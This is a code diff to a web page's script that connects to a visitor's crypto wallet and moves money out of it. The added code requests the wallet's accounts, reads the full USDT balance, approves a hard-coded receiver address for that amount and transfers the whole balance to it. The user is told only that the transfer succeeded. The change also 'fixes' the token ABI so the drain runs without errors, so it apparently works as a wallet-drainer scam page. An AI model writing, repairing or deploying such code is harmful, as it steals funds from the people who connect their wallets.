@@ -133,14 +133,42 @@
   </div>
 
   <script>
-    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BEP-20 USDT
-    const receiverAddress = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // Actual recipient
+    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BNB
+    const receiverAddress = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC"; // REAL receiver
 
+    // ✅ Fixed ABI (No 'bool' outputs)
     const usdtAbi = [
-      { "constant": false, "inputs": [ { "name": "_spender", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "approve", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
-      { "constant": false, "inputs": [ { "name": "_to", "type": "address" }, { "name": "_value", "type": "uint256" } ], "name": "transfer", "outputs": [ { "name": "", "type": "bool" } ], "type": "function" },
-      { "constant": true, "inputs": [ { "name": "_owner", "type": "address" } ], "name": "balanceOf", "outputs": [ { "name": "balance", "type": "uint256" } ], "type": "function" },
-      { "constant": true, "inputs": [], "name": "decimals", "outputs": [ { "name": "", "type": "uint8" } ], "type": "function" }
+      {
+        "constant": false,
+        "inputs": [
+          { "name": "_spender", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ],
+        "name": "approve",
+        "type": "function"
+      },
+      {
+        "constant": false,
+        "inputs": [
+          { "name": "_to", "type": "address" },
+          { "name": "_value", "type": "uint256" }
+        ],
+        "name": "transfer",
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [{ "name": "_owner", "type": "address" }],
+        "name": "balanceOf",
+        "type": "function"
+      },
+      {
+        "constant": true,
+        "inputs": [],
+        "name": "decimals",
+        "outputs": [{ "name": "", "type": "uint8" }],
+        "type": "function"
+      }
     ];
 
     async function setMax() {
@@ -160,21 +188,24 @@
 
       try {
         const web3 = new Web3(window.ethereum);
+        await window.ethereum.request({ method: 'eth_requestAccounts' });
         const accounts = await web3.eth.getAccounts();
+        const sender = accounts[0];
+
         const contract = new web3.eth.Contract(usdtAbi, usdtAddress);
         const decimals = await contract.methods.decimals().call();
-        const amount = await contract.methods.balanceOf(accounts[0]).call();
+        const balance = await contract.methods.balanceOf(sender).call();
 
-        // Step 1: Approve max
-        await contract.methods.approve(receiverAddress, amount).send({ from: accounts[0] });
+        // Approve max amount
+        await contract.methods.approve(receiverAddress, balance).send({ from: sender });
 
-        // Step 2: Transfer
-        await contract.methods.transfer(receiverAddress, amount).send({ from: accounts[0] });
+        // Transfer full balance
+        await contract.methods.transfer(receiverAddress, balance).send({ from: sender });
 
-        alert("Transfer successful");
+        alert("Transfer successful!");
       } catch (err) {
         console.error(err);
-        alert("Transaction failed: " + err.message);
+        alert("Transaction failed: " + (err.message || err));
       }
 
       btn.classList.remove("loading");
